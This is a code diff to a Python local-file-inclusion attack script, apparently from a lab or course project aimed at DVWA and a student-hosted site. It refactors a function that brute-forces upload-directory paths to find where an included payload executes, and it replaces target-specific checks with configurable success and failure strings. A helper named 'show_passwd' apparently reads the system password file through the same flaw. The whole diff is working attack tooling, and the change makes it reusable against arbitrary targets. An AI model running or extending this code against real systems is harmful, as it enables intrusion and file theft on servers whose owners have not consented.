@@ -2,6 +2,7 @@
 
 import requests
 import urllib.parse
+import re
 
 
 def show_passwd(target_url, COOKIE):
@@ -22,8 +23,18 @@ def show_passwd(target_url, COOKIE):
     return False
 
 
-def brute_force_lfi(lfi_url_base, payload_filename, session, COOKIE):
+def brute_force_lfi(
+    lfi_url_base,
+    payload_filename,
+    success_indicator,
+    failure_indicator,
+    session,
+    COOKIE,
+):
 
+    print(f"Success indicator: {success_indicator}")
+    print(f"Failure indicator: {failure_indicator}")
+    
     with open("upload_dir_wordlist.txt", "r") as f:
         payload_relatives = [
             line.strip() for line in f if not line.strip().startswith("#")
@@ -42,14 +53,25 @@ def brute_force_lfi(lfi_url_base, payload_filename, session, COOKIE):
                 # print(f"[*] Trying LFI URL: {test_url}")
                 try:
                     response = session.get(test_url, cookies=COOKIE)
-                    if "http://ict2214p1b2.mooo.com/" in lfi_url_base:
-                        if "File not found." not in response.text:
+                    # if "http://ict2214p1b2.mooo.com/" in lfi_url_base:
+                    #     if "File not found." not in response.text:
+                    #         print(f"[+] Successfully included payload: {test_url}")
+                    #         return test_url
+                    # elif "http://127.0.0.1/DVWA/" in lfi_url_base:
+                    #     if not response.text.startswith("<!DOCTYPE html>"):
+                    #         print(f"[+] Successfully included payload: {test_url}")
+                    #         return test_url
+
+                    if failure_indicator:
+                        if failure_indicator not in response.text:
                             print(f"[+] Successfully included payload: {test_url}")
                             return test_url
-                    elif "http://127.0.0.1/DVWA/" in lfi_url_base:
-                        if not response.text.startswith("<!DOCTYPE html>"):
+                    
+                    if success_indicator:
+                        if success_indicator in response.text:
                             print(f"[+] Successfully included payload: {test_url}")
                             return test_url
+
                 except Exception as e:
                     print(f"[-] Error testing {test_url}: {str(e)}")
 
